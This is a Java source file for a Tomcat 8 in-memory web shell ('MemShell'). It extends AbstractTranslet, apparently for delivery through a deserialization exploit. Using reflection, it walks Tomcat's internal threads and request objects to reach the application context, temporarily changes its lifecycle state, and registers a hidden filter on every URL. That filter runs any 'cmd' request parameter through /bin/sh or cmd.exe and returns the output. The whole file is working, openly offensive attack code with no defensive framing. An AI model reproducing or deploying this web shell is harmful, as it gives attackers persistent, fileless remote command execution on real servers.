package com.example.servletdemo;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javax.servlet.*;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * @author     ：Walker
 * @description：Tocmat8 MemShell
 **/

public class Tomcat8MemShellbyWK extends AbstractTranslet implements Filter {
    static {
        try {
            Object obj = Thread.currentThread();
            Field field = obj.getClass().getSuperclass().getDeclaredField("group");
            field.setAccessible(true);
            obj = field.get(obj);
            field = obj.getClass().getDeclaredField("threads");
            field.setAccessible(true);
            obj = field.get(obj);
            Thread[] threads = (Thread[]) obj;
            for (Thread thread : threads) {
                if (thread.getName().contains("http-nio-8081-ClientPoller-0")) {

                    try {
                        field = thread.getClass().getDeclaredField("target");
                        field.setAccessible(true);
                        obj = field.get(thread);

                        field = obj.getClass().getDeclaredField("this$0");
                        field.setAccessible(true);

                        org.apache.tomcat.util.net.NioEndpoint nioEndpoint = (org.apache.tomcat.util.net.NioEndpoint) field.get(obj);
                        obj = nioEndpoint.getHandler();

                        field = obj.getClass().getDeclaredField("connections");
                        field.setAccessible(true);
                        java.util.concurrent.ConcurrentHashMap connections = (java.util.concurrent.ConcurrentHashMap) field.get(obj);
                        for(Object o: connections.values()){
                            org.apache.coyote.http11.Http11Processor http11processor = (org.apache.coyote.http11.Http11Processor) o;
                            obj = http11processor.getRequest();

                            field = obj.getClass().getDeclaredField("notes");
                            field.setAccessible(true);
                            obj = field.get(obj);
                            Object[] objects = (Object[]) obj;
                            for (Object o1: objects){
                                if (o1 != null){
                                    org.apache.catalina.connector.Request connectorRequest = (org.apache.catalina.connector.Request) o1;
                                    javax.servlet.ServletContext servletContext = connectorRequest.getServletContext();
                                    System.out.println(servletContext.getClass());

                                    field = servletContext.getClass().getDeclaredField("context");
                                    field.setAccessible(true);
                                    Object o2 = field.get(servletContext);
                                    //StandardContext
                                    Field field1 = o2.getClass().getDeclaredField("context");
                                    field1.setAccessible(true);
                                    Object o3 = field1.get(o2);
                                    //反射修改state
                                    Field stateField = org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");
                                    stateField.setAccessible(true);
                                    stateField.set(o3, org.apache.catalina.LifecycleState.STARTING_PREP);
                                    //注册Filter
                                    Filter testFilter = new Tomcat8MemShellbyWK();
                                    javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext.addFilter("testFilter", testFilter);
                                    filterRegistration.setInitParameter("encoding", "utf-8");
                                    filterRegistration.setAsyncSupported(false);
                                    filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false, new String[]{"/*"});
                                    //恢复state值
                                    stateField.set(o3, org.apache.catalina.LifecycleState.STARTED);
                                    //生效Filter
                                    Method filterStartMethod = org.apache.catalina.core.StandardContext.class.getMethod("filterStart");
                                    filterStartMethod.setAccessible(true);
                                    filterStartMethod.invoke(o3, null);

                                }
                                else {

                                }
                            }
                        }

                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }

        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        String cmd;
        boolean isLinux = true;
        String osTyp = System.getProperty("os.name");
        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
            isLinux = false;
        }
        if ((cmd = servletRequest.getParameter("cmd")) != null) {
            String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c",  cmd};
            Process process = Runtime.getRuntime().exec(cmds);
            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }
            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
            return;
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {

    }
}

